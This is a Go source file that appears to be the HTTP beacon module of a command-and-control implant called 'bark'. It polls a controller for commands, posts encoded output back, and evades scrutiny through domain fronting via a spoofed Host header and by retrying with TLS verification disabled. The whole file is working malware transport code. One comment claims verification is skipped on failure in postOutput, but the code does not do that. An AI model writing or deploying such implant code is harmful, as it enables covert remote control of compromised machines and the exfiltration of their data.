package bark

import (
	"bytes"
	"crypto/tls"
	"io"

	"log"
	"net/http"
)

type HTTPConfig struct {
	//Urls & HTTP details - ID determines url used
	Reguri  string
	Barkuri string
	Posturi string

	//Host Header and user-agent (for domain fronting)
	Hh string
	Ua string

	Proxyurl  string
	Proxyuser string
}

var proxy bool

// Create a new HTTP Barker
func NewHTTPBarker(name string) *HTTPConfig {
	httpconf := &HTTPConfig{}
	Barkers[name] = httpconf
	return httpconf
}

func UpdateHTTPBarker(name string, httpconf *HTTPConfig) {
	Barkers[name] = httpconf
}

// Beacon out for cmd
func (httpconf *HTTPConfig) beaconOut(url string) ([]byte, error) {

	//Create new request
	request, err := http.NewRequest("GET", url+httpconf.Barkuri, nil)
	if err != nil {
		return nil, err
	}
	if httpconf.Hh != "" {
		request.Host = httpconf.Hh
	}
	request.Header.Set("User-Agent", httpconf.Ua)

	//Set to ignore tls verification and if proxy is valid, use it.
	var tr *http.Transport
	tr = &http.Transport{
		TLSClientConfig: &tls.Config{ServerName: request.Host},
		Proxy:           http.ProxyFromEnvironment,
	}

	//init client and send request.
	client := &http.Client{}
	var resp *http.Response
	resp, err = client.Do(request)
	if err != nil {

		request.Close = true
		tr.TLSClientConfig.InsecureSkipVerify = true
		client := &http.Client{Transport: tr}
		resp, err = client.Do(request)
		if err != nil {

			return nil, err
		}
	}
	defer resp.Body.Close()

	request.Close = true

	if resp.StatusCode != 200 {

		return nil, nil
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {

		return nil, nil
	}

	return body, nil
}

// Post Data back to server
func (httpconf *HTTPConfig) postOutput(url string, encbytes []byte) ([]byte, error) {

	//build the post request
	request, err := http.NewRequest("POST", url+httpconf.Posturi, bytes.NewReader(encbytes))
	if err != nil {
		log.Println(err)
	}
	if httpconf.Hh != "" {
		request.Host = httpconf.Hh

	}
	request.Header.Set("User-Agent", httpconf.Ua)

	var tr *http.Transport
	tr = &http.Transport{
		TLSClientConfig: &tls.Config{ServerName: request.Host},
		Proxy:           http.ProxyFromEnvironment,
	}

	//Send the request, if TLS fails - skip verification.
	client := &http.Client{}
	_, err = client.Do(request)
	if err != nil {
		client := &http.Client{Transport: tr}
		_, err = client.Do(request)
		if err != nil {
			log.Println(err)
		}
	}

	return nil, nil

}
